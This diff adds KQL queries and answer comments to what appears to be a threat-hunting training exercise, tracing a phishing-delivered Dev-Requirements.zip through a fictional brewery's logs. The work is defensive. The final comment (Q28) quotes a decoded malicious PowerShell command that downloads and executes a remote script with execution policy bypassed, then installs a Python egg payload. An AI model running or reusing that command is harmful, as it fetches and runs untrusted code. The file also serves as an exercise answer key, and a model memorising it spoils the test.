@@ -1,3 +1,265 @@
 // Hops and stuff
 
 // BG: HopsNStuff is a brewery that makes ginger beer. They have a secret formula.
+
+// Section 1
+// Q1 done 
+
+// Q2
+Employees
+| count
+
+// Q3
+Employees
+| where ip_addr == "192.168.2.191"
+// John Clark - john_clark@hopsnstuff.com - joclark1 - Brewer - HVYC-DESKTOP
+
+// Q4
+let simons_email=
+Employees
+| where name == "Simeon Kakpovi"
+| distinct email_addr;
+Email
+| where recipient in (simons_email)
+| count
+
+// Q5
+Email
+| where sender has "easterdelights.org"
+| distinct sender
+| count
+
+// Q6
+OutboundNetworkEvents
+| take 10
+
+let raymond_ip =
+Employees
+| where name == "Arthur Raymond"
+| distinct ip_addr;
+OutboundNetworkEvents
+| where src_ip in (raymond_ip)
+| distinct url
+| count
+
+// Q7
+PassiveDns
+| where domain contains "automation"
+| distinct domain
+| count
+
+// Q8
+PassiveDns
+| where domain contains "automationpackages.com"
+| distinct ip
+// 190.78.143.29 and 200.64.106.15
+
+// Q9
+let karen_ips =
+Employees
+| where name has "Karen"
+| distinct ip_addr;
+OutboundNetworkEvents
+| where src_ip in (karen_ips)
+| distinct url
+| count
+
+// Section 2
+
+// Q1
+SecurityAlerts
+| take 10
+
+SecurityAlerts
+| where timestamp > datetime(2023-03-31T00:00:00Z)
+// A suspicious file was quarantined on host QBYQ-DESKTOP: Dev-Requirements.zip
+
+// Q2
+Employees
+| where hostname == "QBYQ-DESKTOP"
+// Barbara Rochford - 192.168.1.69 - barbara_rochford@hopsnstuff.com - barochford - Packaging Technician
+
+// Q3
+FileCreationEvents
+| where filename == "Dev-Requirements.zip"
+| distinct hostname
+| count
+
+// Q4
+FileCreationEvents
+| where filename == "Dev-Requirements.zip"
+// 2023-03-23T09:52:06Z - FTVO-LAPTOP - megeisinsky
+
+// Q5
+Employees
+| where hostname == "FTVO-LAPTOP"
+| distinct role
+// Logistics Coordinator - Meghann Geisinsky - 192.168.1.75 - meghann_geisinsky@hopsnstuff.com
+
+// Q6
+Email
+| where recipient == "meghann_geisinsky@hopsnstuff.com" and sender !has "hopsnstuff.com"
+| count
+
+// Q7
+let atkd_hostnames =
+FileCreationEvents
+| where filename == "Dev-Requirements.zip"
+| distinct hostname;
+let atkd_emails =
+Employees
+| where hostname in (atkd_hostnames)
+| distinct email_addr;
+Email
+| where recipient in (atkd_emails) and sender !has "hopsnstuff.com"
+| count
+
+// Q8
+let atkd_hostnames =
+FileCreationEvents
+| where filename == "Dev-Requirements.zip"
+| distinct hostname;
+let atkd_emails =
+Employees
+| where hostname in (atkd_hostnames)
+| distinct email_addr;
+Email
+| where recipient in (atkd_emails) and sender !has "hopsnstuff.com"
+| where verdict == "BLOCKED"
+// 2023-04-08T16:00:19Z - Sender: dorothy_christopher@yandex.com
+
+// Q9
+// google'd yandex hq - Russia
+
+// Q10 - Q12
+// Dev-Requirements.zip 
+let atkd_hostnames =
+FileCreationEvents
+| where filename == "Dev-Requirements.zip"
+| distinct hostname;
+let atkd_emails =
+Employees
+| where hostname in (atkd_hostnames)
+| distinct email_addr;
+Email
+| where recipient in (atkd_emails) and sender !has "hopsnstuff.com"
+| where verdict == "SUSPICIOUS"
+// Sender: catherine_phillips@ingredientswarehouse.com - 2023-03-24T04:28:56Z - Reply to: development_software@hotmail.com - http://development-module.com/search/search/images/files/Dev-Requirements.zip - Recipient: john_clark@hopsnstuff.com
+
+// Q13
+PassiveDns
+| where domain == "development-module.com"
+// 221.2.0.193 - IP closest in time to event in Q10-Q12
+
+// Q14
+// John Clark - john_clark@hopsnstuff.com - joclark1 - Brewer - HVYC-DESKTOP
+let john_ip =
+Employees
+| where email_addr == "john_clark@hopsnstuff.com"
+| distinct ip_addr;
+OutboundNetworkEvents
+| where src_ip in (john_ip)
+| where url contains "http://development-module.com/search/search/images/files/Dev-Requirements.zip"
+// 2023-03-24T10:07:34Z - Time the file was clicked from John's computer
+
+// Q15
+OutboundNetworkEvents
+| where url has "Dev-Requirements.zip"
+| distinct url
+| count
+
+// Q16
+let atkd_hostnames =
+FileCreationEvents
+| where filename == "Dev-Requirements.zip"
+| distinct hostname;
+let atkd_emails =
+Employees
+| where hostname in (atkd_hostnames)
+| distinct email_addr;
+Email
+| where recipient in (atkd_emails) and sender !has "hopsnstuff.com"
+| where verdict == "SUSPICIOUS"
+// Python
+
+// Q17
+ProcessEvents
+| where process_commandline has "python"
+// powershell.exe Get-Command python
+
+// Q18
+ProcessEvents
+| where process_commandline has "python"
+| distinct hostname
+
+// Q19
+let process_names =
+ProcessEvents
+| where process_commandline has "python"
+| distinct parent_process_name;
+ProcessEvents
+| where parent_process_name in (process_names)
+| summarize count() by parent_process_name
+// rabbitmq.exe and nettor.dll
+
+// Q20
+// How many distinct hosts had these processes run on their systems? 
+let mal_process = datatable(filename: string)
+[
+    "rabbitmq.exe",
+    "nettor.dll"
+];
+ProcessEvents
+| where parent_process_name in (mal_process)
+| distinct hostname
+| count
+
+// Q21
+// When was the earliest time these processes were seen? 
+let mal_process = datatable(filename: string)
+[
+    "rabbitmq.exe",
+    "nettor.dll"
+];
+ProcessEvents
+| where parent_process_name in (mal_process)
+
+// Q22-Q23
+// Look for where the file was first seen on a host. Where was this file located? Copy and paste the full path. 
+// First file sighting - rabbitmq.exe
+// Q23 - // What is the SHA256 hash of this file?
+FileCreationEvents
+| where filename == "rabbitmq.exe"
+
+// Q24
+// Search this hash on virustotal.com. What is the md5 hash for this file?
+// 30bb094cc616fb4715cef4398a24b76570031ae23f86c4da4f8fd7e5c03ddfc5
+// MD5: 76d965def5c93a8fda85cff949edf7c6
+
+// Q25 
+// Let's look for the file in other places. What was the path for the file observed on March 13, 2023?
+FileCreationEvents
+| where filename == "rabbitmq.exe"
+// C:\Users\Public\rabbitmq.exe
+
+// Q26
+// Now let's look at that path across all of the devices. We've already seen some files here from our previous investigation. Which file haven't we seen before?
+FileCreationEvents
+| where path contains "C:\\Users\\Public"
+// go.dll
+
+// Q27
+// Now that we have 3 file names, let's go back to our process events and find all parent processes that use these files. How many total records are there? 
+let mal_process = datatable(filename: string)
+[
+    "rabbitmq.exe",
+    "nettor.dll",
+    "go.dll"
+];
+ProcessEvents
+| where parent_process_name in (mal_process)
+
+// Q28
+// These executables seem to run powershell.exe on the command line and has some garbled text after it. After figuring out how to ungarble it, investigate what it's doing. A file is referenced at the end. What is it? 
+// Q27 Query
+// powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))" && SET "PATH=%PATH%;%ALLUSERSPROFILE%\chocolatey\bin"; choco install -y python3; python3 -m easy_install C:\Users\Public\rotten.egg
